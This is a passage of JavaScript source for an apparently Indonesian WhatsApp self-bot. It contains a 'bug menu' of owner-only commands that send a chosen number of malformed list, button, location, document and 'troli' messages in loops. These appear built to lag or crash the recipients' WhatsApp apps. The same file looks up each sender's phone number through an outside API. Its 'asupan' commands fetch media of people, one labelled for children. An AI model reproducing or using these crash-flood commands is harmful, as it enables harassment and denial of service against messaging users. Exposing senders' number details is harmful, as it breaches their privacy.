 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "CieKontol",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
client.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
await client.relayWAMessage(client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
break
		case 'bugtroliv2':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('jumlah?')
			for (let i = 0; i < args[0]; i++) {
				troliv2('I-AM BOOST')
			}
			reply('Sukses send bug sebanyak '+args.join(' '))
			break
		case 'bugtroli':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('jumlah?')
			for (let i = 0; i < args[0]; i++) {
				client.sendMessage(from, 'I-AM BOOST', text, { thumbnail: ofrply, sendEphemeral: true, quoted: ftroli})
			}
			reply('Sukses send bug sebanyak '+args.join(' '))
			break
		case 'bugbutton':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('jumlah?')
			for (let i = 0; i < args[0]; i++) {
				sendButImage(from, `Bug Hanya Ilusi?`, `I-AM BOOST`, ofrply,
				[{buttonId:`${prefix}bugbutton`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
				{buttonId:`${prefix}bugbutton`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
				{buttonId:`${prefix}bugbutton`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 }],
				{
					quoted:mek, contextInfo: {
						forwardingScore: 999, isForwarded: true }})
			}
			break
		case 'bugbuttonlocation':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('jumlah?')
			for (let i = 0; i < args[0]; i++) {
				sendButLocation(from, `Bug Hanya Ilusi?`, `I-AM BOOST`, ofrply,
				[{buttonId:`${prefix}bugbuttonlocation`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
				{buttonId:`${prefix}bugbuttonlocation`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
				{buttonId:`${prefix}bugbuttonlocation`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 }],
				{
					quoted:mek, contextInfo: {
						forwardingScore: 999, isForwarded: true }})
			}
			break
		case 'bugbuttondocument':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('jumlah?')
			for (let i = 0; i < args[0]; i++) {
				sendButDocument(from, `Bug Hanya Ilusi?`, `I-AM BOOST`, fs.readFileSync('./stik/doc'), { mimetype: Mimetype.pdf, thumbnail: fs.readFileSync('./stik/doc'), filename: `I-AM BOOST ${apis2}`},
				[{buttonId:`${prefix}bugbuttondocument`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
				{buttonId:`${prefix}bugbuttondocument`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 },
				{buttonId:`${prefix}bugbuttondocument`,buttonText:{displayText:`I-AM BOOST ${apis}`}, type:1 }],
				{
					quoted:mek, contextInfo: {
						forwardingScore: 999, isForwarded: true }})
			}
			break
		case 'buglistmenu':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return fakestatus('jumlah?')
			for (let i = 0; i < args[0]; i++) {
				sendlistMessage(from, `LIST MENU}`, 'Powered By I-AM BOOST',
				[{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]},
				{title: `I-AM BOOST ${apis2}`, rows: [{"title":`By I-AM BOOST ${apis2}`, "rowId":""}]}],
				{
					quoted:mek, contextInfo: {
						forwardingScore: 999, isForwarded: true }})
			}
			break
		case 'jadiv':
			if (!isOwner && !mek.key.fromMe) return
			if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
				encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
				ini_buffer = fs.readFileSync(file)
				client.sendMessage(from, ini_buffer, image, {thumbnail:fs.readFileSync('./stik/virgam.jpg')})
				fs.unlinkSync(file)
			} else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
				encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				file = await client.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
				ini_buffer = fs.readFileSync(file)
				client.sendMessage(from, ini_buffer, video)
				fs.unlinkSync(file)
			} else {
				reply(`reply gambar/video dengan caption ${prefix}jadiv`)
			}
			break
			/*BATAS CASE BUG*/
		case 'menu': case 'help':
			sendernya = `${sender}`
			stst = await client.getStatus(`${sender.split('@')[0]}@c.us`)
			stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
			menu = `\n${tampilUcapan} ${pushname}\n\nNama Owner : I-AM BOOST\nNomor Owner : @${ownerNumber.split('@')[0]}\nBattery : ${baterai.battery}\nCharge : ${baterai.isCharge}\nMode : ${banChats ? 'Self-mode' : 'Public-mode'}\nAuto vn : ${vn ? 'true' : 'false'}\nAuto ketik : ${ketik ? 'true' : 'false'}\nAuto join : ${autojoin ? 'true' : 'false'}\nAnti calls : ${antical ? 'true' : 'false'}\nTotal Hit : 6251${cmhit.length}\n\nINFO USER\n\nStatus : ${isOwner ? 'Owner' : 'User'}\nNama : ${pushname}\nBio : ${stst}\nNomor : @${sendernya.split('@')[0]}\nInfo Nomor : ${num.line_type} - ${num.country_name} - ${num.carrier}`
			sendButImage(from, `${menu}`, "I-AM BOOST", ofrply, 
			[{buttonId:`${prefix}command`, buttonText:{displayText:'ALL MENU📝'}, type:1 },
			{buttonId:`${prefix}creator`, buttonText:{displayText:'OWNER 👥'}, type:1 },
			{buttonId:`${prefix}sc`, buttonText:{displayText:'SCRIPT 🔖'}, type:1 }],
			{
				quoted:finv, contextInfo: {
					mentionedJid: [ownerNumber,sendernya], forwardingScore: 999, isForwarded: true, externalAdReply: {title: `${jmn} - ${week} ${weton} - ${calender}`,body:"I-AM BOOST",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://g.top4top.io/p_21721a9z60.jpg"}}})
			break
		case 'allmenu': case 'command':
			menu = `\n${tampilUcapan} ${pushname}\n\n\nSTICKER MENU\n\n${prefix}sticker\n${prefix}stickerwm nama|author\n${prefix}take nama|author\n${prefix}attp <text>\n\nFUN MENU\n\n${prefix}fast\n${prefix}slow\n${prefix}reverse\n${prefix}readmore\n${prefix}detikvn\n${prefix}detikvideo\n${prefix}caripesan <text>\n${prefix}listgroup\n${prefix}status\n${prefix}wiki <text>\n\nDOWNLOAD MENU\n\n${prefix}ytmp4 <link>\n${prefix}ytmp3 <link>\n${prefix}ytsearch <text>\n${prefix}igdl <link>\n${prefix}tiktokdl <link>\n\nGROP MENU\n\n${prefix}setnamegc <nama group>\n${prefix}setdeskgc <desk group>\n${prefix}kick @tag member\n${prefix}add 62xxxxx\n${prefix}hidetag <text>\n${prefix}sider\n${prefix}tag\n${prefix}tagme\n${prefix}demote @tag admin\n${prefix}promote @tag member\n${prefix}linkgroup\n${prefix}resetlinkgroup\n${prefix}opengc\n${prefix}closegc\n${prefix}antilink 1/0\n${prefix}antivirtex 1/0\n${prefix}tictactoe @tag teman\n${prefix}delttt\n\nASUPAN MENU\n\n${prefix}asupancecan\n${prefix}asupanhijab\n${prefix}asupansantuy\n${prefix}asupanukty\n${prefix}asupanbocil\n${prefix}asupanrika\n\nOWNER MENU\n\n${prefix}anticall on/off\n${prefix}welcome on/off\n${prefix}autojoin on/off\n${prefix}autovn on/off\n${prefix}bc ( text )\n${prefix}runtime\n${prefix}autoketik on/off\n${prefix}leave\n${prefix}public\n${prefix}self\n${prefix}setprefix\n\n`
			sendButImage(from, `${menu}`, "By I-AM BOOST", ofrply, 
			[{buttonId:`${prefix}sc`, buttonText:{displayText:'SC'}, type:1 },
			{buttonId:`${prefix}bgmnu`, buttonText:{displayText:'BUG MENU'}, type:1 }],
			{
				quoted:finv, contextInfo: {
					forwardingScore: 999, isForwarded: true, externalAdReply: {title: `${jmn} - ${week} ${weton} - ${calender}`,body:"I-AM BOOST",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://g.top4top.io/p_21721a9z60.jpg"}}})
			break
		case 'bgmnu': case 'bugmenu':
			if (!isOwner && !mek.key.fromMe) return
			menu = `\n${tampilUcapan} ${pushname}\n\n${prefix}buggc jumlah\n${prefix}jadiv tag video/foto\n${prefix}bugtroli jumlah\n${prefix}bugtroliv2 jumlah\n${prefix}bugbutton jumlah\n${prefix}buglistmenu jumlah\n${prefix}bugbuttondocument jumlah\n${prefix}bugbuttonlocation jumlah\n`
			sendButDocument(from, `${menu}`, "MENU", fs.readFileSync('./stik/doc'), { mimetype: Mimetype.pdf, thumbnail: fs.readFileSync('./stik/doc'), filename: 'I-AM BOOST'},
			[{buttonId:`${prefix}sc`, buttonText:{displayText:'SC'}, type:1 }],
			{
				quoted:mek, contextInfo: {
					externalAdReply: {title: 'All Bug',body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://github.com/wgduwjej/self-bot"}}})
			break
		case 'status':
			menu = `\n\nCreator : @${creator.split('@')[0]}\nOwner : I-AM BOOST\nNomor Owner : @${ownerNumber.split('@')[0]}\nMode : ${banChats ? 'Self-mode' : 'Public-mode'}\nBattery : ${baterai.battery}\nCharge : ${baterai.isCharge}\nWa Version : ${client.user.phone.wa_version}\nStatus : ${isOwner ? 'Owner' : 'User'}\n\n`
			sendButImage(from, `${menu}`, 'I-AM BOOST', ofrply,
			[{buttonId:`${prefix}menu`, buttonText:{displayText:'MENU📝'}, type:1 },
			{buttonId:`${prefix}sc`, buttonText:{displayText:'SC📥'}, type:1 }],
			{
				quoted:finv, contextInfo: {
					mentionedJid: [ownerNumber,creator], forwardingScore: 999, isForwarded: true, externalAdReply: {title: `${jmn} - ${week} ${weton} - ${calender}`,body:"I-AM BOOST",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:"https://g.top4top.io/p_21721a9z60.jpg"}}})
			break
		case 'setnamegc': 
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return 
				client.groupUpdateSubject(from, `${body.slice(11)}`) 
				reply(`Sukses mengganti nama grup ke ${body.slice(11)}`)
			break
		case 'setdeskgc': case 'setdescgc':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return
				client.groupUpdateDescription(from, `${body.slice(10)}`)
				reply(`Sukses mengganti deskripsi grup ke ${body.slice(10)}`)
			break
		case 'leave':
			if (!isGroup) return reply(mess.only.group)
			if (!isOwner && !mek.key.fromMe) return
				client.groupLeave(from)
			break
		case 'owner': case 'creator': case 'developer': case 'author':
			sendKontak(from, creator, 'I-AM BOOST')
			break
		case 'sc': case 'sourcecode':
			client.sendMessage(from, { text: "NGAPAIN BANG?", matchedText: 'https://g.top4top.io/p_21721a9z60.jpg', description: "", title: "Don't click here !!!", jpegThumbnail: ofrply }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
			break
		case 'public':
			if (!isOwner && !mek.key.fromMe) return
			if (banChats === false) return reply("[ - PUBLIC MODE - ]")
				banChats = false
				reply(`[ - PUBLIK - ]`)
			break
		case 'self':
			if (!isOwner && !mek.key.fromMe) return
			if (banChats === true) return reply("[ - SELF MODE - ]")
				uptime = process.uptime()
				banChats = true
				reply(`[ - SELF - ]`)
			break
		case 'kick':
            if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return 
			if (!isGroup) {
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
				mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
				mentions(mentioned, true)
				client.groupRemove(from, mentioned)
			} else {
				await client.groupRemove(from, mentionUser)
				reply(`SUCCESS`)
			}
			break
case 'runtime':
    case 'test':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
            run = process.uptime() 
            teks = `${kyun(run)}`
            reply(teks)
            break  
		case 'add':	
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return 	 
			if (args.length < 1) return reply('NOMER NYA MANA')
			if (args[0].startsWith('08')) return reply('GUNAKAN KODE NEGARA!')
			try {
				num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
				client.groupAdd(from, [num])
			} catch (e) {
				console.log('Error :', e)
				reply('GAGAL MENAMBAHKAN TARGET, MUNGKIN KARENA DI PRIVATE')
			}
			break
		case 'hidetag':
			if (!isGroup)return
			var value = args.join(' ')
			var group = await client.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
				text: value,
				contextInfo: { mentionedJid: mem },
				quoted: mek
			}
			client.sendMessage(from, optionshidetag, text)
			break
		case 'sider':
			if (!isGroup) return reply(mess.only.group)
			infom = await client.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
			tagg = []
			teks = `Telah Dibaca Oleh :\n\n`
			for(let i of infom.reads){ 
				teks += '@' + i.jid.split('@')[0] + '\n'
				teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
				tagg.push(i.jid)
			}
			mentions(teks, tagg, true)
			break
		case 'anticall':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('on/off?')
			if (args[0] === "on") {
				if(antical)return reply('Udah aktif!')
				antical = true
				reply(`Suksess mengaktifkan anticall`)
			} else if (args[0] === "off") {
				if(!antical)return reply('Udah Mati')
				antical = false
				reply(`Suksess mematikan anticall`)
			} else {
				reply(`Pilih on / off`)
			}
			break
case 'bc':
         if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
         if (args.length < 1) return reply('.......')
         anu = await client.chats.all()
         if (isMedia && !mek.message.videoMessage || isQuotedImage) {
         const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
         bc = await client.downloadMediaMessage(encmedia)
         for (let _ of anu) {
         client.sendMessage(_.jid, bc, image, { caption: `[ I-AM BOOST izin Broadcast ]\n\n${body.slice(4)}` })
         }
         reply('Suksess broadcast')
         } else {
         for (let _ of anu) {
         client.sendMessage(_.jid, `[ * BROADCAST ALL* ]\n\n${body.slice(4)}`)
         }
         reply('Suksess broadcast')
         }
		break
		case 'autojoin':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('on/off?')
			if (args[0] === "on") {
				if(autojoin)return reply('Udah aktif!')
				autojoin = true
				reply(`Suksess mengaktifkan autojoin`)
			} else if (args[0] === "off") {
				if(!autojoin)return reply('Udah Mati')
				autojoin = false
				reply(`Suksess mematikan autojoin`)
			} else {
				reply(`Pilih on / off`)
			}
			break
		case 'autovn':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('on/off?')
			if (args[0] === "on") {
				if(vn)return reply('Udah aktif!')
				vn = true
				reply(`Suksess mengaktifkan auto vn`)
			} else if (args[0] === "off") {
				if(!vn)return reply('Udah Mati')
				vn = false
				reply(`Suksess mematikan auto vn`)
			} else {
				reply(`Pilih on / off`)
			}
			break
		case 'autoketik':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('on/off?')
			if (args[0] === "on") {
				if(ketik)return reply('Udah aktif!')
				ketik = true
				reply(`Suksess mengaktifkan auto ketik`)
			} else if (args[0] === "off") {
				if(!ketik)return reply('Udah Mati')
				ketik = false
				reply(`Suksess mematikan auto ketik`)
			} else {
				reply(`Pilih on / off`)
			}
			break
		case 'online':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('on/off?')
			if (args[0] === "on") {
				if(online)return reply('Udah aktif!')
				online = true
				reply(`Mengubah info menjadi online`)
			} else if (args[0] === "off") {
				if(!online)return reply('Udah Mati')
				online = false
				reply(`Suksess mematikan always online`)
			} else {
				reply(`Pilih on / off`)
			}
			break
		case 'welcome':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return reply('on/off?')
			if (args[0] === "on") {
				if(welcom)return reply('Udah aktif!')
				welcom = true
				reply(`Suksess mengaktifkan welcome`)
			} else if (args[0] === "off") {
				if(!welcom)return reply('Udah Mati')
				welcom = false
				reply(`Suksess mematikan welcome`)
			} else {
				reply(`Pilih on / off`)
			}
			break
		case 'setprefix':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return sendButMessage(from, `PREFIX SETTINGS`, `Silahkan pilih salah satu`, 
			[{ buttonId: `setprefix multi`, buttonText: { displayText: `Multi Prefix` }, type: 1 },
			{ buttonId: `setprefix nopref`, buttonText: { displayText: `No Prefix` }, type: 1 },
			{ buttonId: `setprefix allpref`, buttonText: { displayText: `All Prefix`}, type: 1 }], {quoted:mek})
			if (q === 'multi'){
				multi = true
				allpref = false
				nopref = false
				reply(`Berhasil mengubah prefix ke ${q}`)
			} else if (q === 'nopref'){
				multi = false
				allpref = false
				nopref = true
				reply(`Berhasil mengubah prefix ke ${q}`)
			} else if (q === 'allpref'){
				allpref = true
				nopref = false
				multi = false
				reply(`Berhasil mengubah prefix ke ${q}`)
			} else {
				multi = false
				nopref = false
				allpref = false
				prefa = `${q}`
				reply(`Berhasil mengubah prefix ke ${q}`)}
			break
		case 'take': case 'colong':
			if (!isQuotedSticker) return reply('Tag Stikernya')
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
			media = await client.downloadAndSaveMediaMessage(encmedia)
			anu = args.join(' ').split('|')
			satu = anu[0] !== '' ? anu[0] : 'I-AM BOOST'
			dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
			require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, client, mek, from)
			break
		case 'tag':
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
			var nomqm = `${body.slice(5)}@s.whatsapp.net` 
			tagq = `@${nomqm.split('@')[0]}` 
			client.sendMessage(from, tagq, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
		case 'tagme':
			var nomqm = mek.participant
			tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
			client.sendMessage(from, tagu, text, { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
		case 'join':
			if (!isOwner && !mek.key.fromMe) return
			if (args.length < 1) return ephe('Link nya mana?')
			client.query({ 
				json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
			})	
			reply('Sukses bergabung dalam group')
			break
		case 'attp':
			if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp ${NamaBot}`)
			atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(q)}`)
			client.sendMessage(from, atetepe, sticker, { quoted: mek })
			break
		case 'fast':
			if (!isQuotedVideo) return reply('Reply videonya!')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
			media = await client.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.mp4')
			exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
				fs.unlinkSync(media)
				if (err) return reply(`Err: ${err}`)
				buffer453 = fs.readFileSync(ran)
				client.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: finv })
				fs.unlinkSync(ran)
			})
			break
		case 'slow':
			if (!isQuotedVideo) return reply('Reply videonya!')
			reply(mess.wait)
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
			media = await client.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.mp4')
			exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
				fs.unlinkSync(media)
				if (err) return reply(`Err: ${err}`)
				buffer453 = fs.readFileSync(ran)
				client.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: finv })
				fs.unlinkSync(ran)
			})
			break
		case 'reverse':
			if (!isQuotedVideo) return reply('Reply videonya!')
			encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
			media = await client.downloadAndSaveMediaMessage(encmedia)
			ran = getRandom('.mp4')
			exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
				fs.unlinkSync(media)
				if (err) return reply(`Err: ${err}`)
				buffer453 = fs.readFileSync(ran)
				client.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: finv })
				fs.unlinkSync(ran)
			})
			break
		case 'asupancecan': 
			reply(mess.wait)
			try {
				results1 = await fetchJson(`https://api-devilbot.herokuapp.com/api/asupan/cecan?apikey=Devilbotz`)
				results2 = await getBuffer(results1.result.url)
				sendImage(results2, mess.sukses)
			} catch (e) { reply("ERROR")}
			break
		case 'asupanhijab':  
			reply(mess.wait)
			try {
				results1 = await fetchJson(`https://api-devilbot.herokuapp.com/api/asupan/hijaber?apikey=Devilbotz`)
				results2 = await getBuffer(results1.result.url)
				sendImage(results2, mess.sukses)
			} catch (e) { reply("ERROR")}
			break
		case 'asupansantuy':
			reply(mess.wait)
			try {
				results1 = await fetchJson(`https://api-devilbot.herokuapp.com/api/asupan/santuy?apikey=Devilbotz`)
				results2 = await getBuffer(results1.result.url)
				sendVideo(results2, mess.sukses)
			} catch (e) { reply("ERROR")}
			break
		case 'asupanukty':
			reply(mess.wait)
			try {
				results1 = await fetchJson(`https://api-devilbot.herokuapp.com/api/asupan/ukty?apikey=Devilbotz`)
				results2 = await getBuffer(results1.result.url)
				sendVideo(results2, mess.sukses)
			} catch (e) { reply("ERROR")}
			break
		case 'asupanrika':
			reply(mess.wait)
			try {
				results1 = await fetchJson(`https://api-devilbot.herokuapp.com/api/asupan/rikagusriani?apikey=Devilbotz`)
				results2 = await getBuffer(results1.result.url)
				sendVideo(results2, mess.sukses)
			} catch (e) { reply("ERROR")}
			break
		case 'asupanbocil':
			reply(mess.wait)
			try {
				results1 = await fetchJson(`https://api-devilbot.herokuapp.com/api/asupan/bocil?apikey=Devilbotz`)
				results2 = await getBuffer(results1.result.url)
				sendVideo(results2, mess.sukses)
			} catch (e) { reply("ERROR")}
			break
		case 'stikerwm': case 'stickerwm': case 'swm':
			var pe = args.join('')
			var a = pe.split("|")[0];
			var b = pe.split("|")[1];
			if (isMedia && !mek.message.videoMessage || isQuotedImage ) { 
				const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
				media = await client.downloadAndSaveMediaMessage(encmedia)
				await createExif(a,b)
				var out = getRandom('.webp')
				ffmpeg(media)
				.on('error', (e) => {
					console.log(e)
					client.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: finv })
					fs.unlinkSync(media)
				})
				.on('end', () => {
					_out = getRandom('.webp')
					spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
					.on('exit', () => {
						client.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: finv })
						fs.unlinkSync(out)
						fs.unlinkSync(_out)
						fs.unlinkSync(media)
					})
				})
				.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
				.toFormat('webp')
				.save(out) 
			} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) { 
				const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
				const media = await client.downloadAndSaveMediaMessage(encmedia)
				var pe = args.join('')
				var a = pe.split("|")[0];
            	var b = pe.split("|")[1];
				await createExif(a,b)
				var out = getRandom('.webp')
				ffmpeg(media)
				.on('error', (e) => {
					console.log(e)
					client.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: finv })
					fs.unlinkSync(media)
				})
				.on('end', () => {
					_out = getRandom('.webp')
					spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
				.on('exit', () => {
					client.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: finv })
					fs.unlinkSync(out)
					fs.unlinkSync(_out)
					fs.unlinkSync(media)
					})
				})
				.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`]) 
				.toFormat('webp')
				.save(out)
			} else { 
				reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`) 
			}
			break
		case 'ytmp4':
			if (args.length === 0) return reply(`Kirim perintah ${prefix}ytmp4 [linkYt]`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
			try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
					const { dl_link, thumb, title, filesizeF, filesize } = res
					axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
					.then((a) => {
						if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `❏ YTmp4\n\n❏ Title : ${title}\n❏ Ext : MP3\nFilesize : ${filesizeF}\nLink : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
						sendFileFromUrl(dl_link, document, {mimetype: 'video/mp4', filename: `${title}.mp4`, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:title,body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:`${body.slice(7)}`}}}).catch(() => reply('ERROR'))
					})
				})
			} catch (err) {
				reply('ERROR')
			}
			break
		case 'ytsearch':
			if (!args.length) return reply('Judulnya apa kak?')
			try {
				reply(mess.wait)
				const input = args.join(" ")
				const filter1 = await ytsd.getFilters(input)
				const filters1 = filter1.get('Type').get('Video')
				const { items } = await ytsd(filters1.url, { limit: 10 })
				let hehe = `┌ ◪ YOUTUBE SEARCH\n└ Search Query: ${input}\n\n`
				for (let i = 0; i < items.length; i++) {
					hehe += `───────────────\n\n┌ ❏ Judul: ${items[i].title}\n├ ❏ Id: ${items[i].id}\n├ ❏ Ditonton: ${items[i].views}\n├ ❏ Durasi: ${items[i].duration}\n└ ❏ Link: ${items[i].url}\n\n`
				}
				thumb = await getBuffer(items[0].bestThumbnail.url)
				await client.sendMessage(from, thumb, image, {quoted: mek, caption: `${hehe}───────────────\n\n┌ ◪ DOWNLOAD\n├ ${prefix}ytmp3 [link yt] = Audio\n└ ${prefix}ytmp4 [link yt] = Video`})
			} catch(e) {
				reply('Didn\'t find anything or there is any error!')
				reply(`Error: ${e.message}`)
			}
			break
		case 'ytmp3':
			if (args.length === 0) return reply(`Kirim perintah ${prefix}ytmp3 [linkYt]`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
			try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
					const { dl_link, thumb, title, filesizeF, filesize } = res
					axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
					.then((a) => {
						if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `❏ YTmp3\n\n❏ Title : ${title}\n❏ Ext : MP3\nFilesize : ${filesizeF}\nLink : ${a.data}\n\n_Maaf durasi melebihi batas maksimal, Silahkan klik link diatas_`)
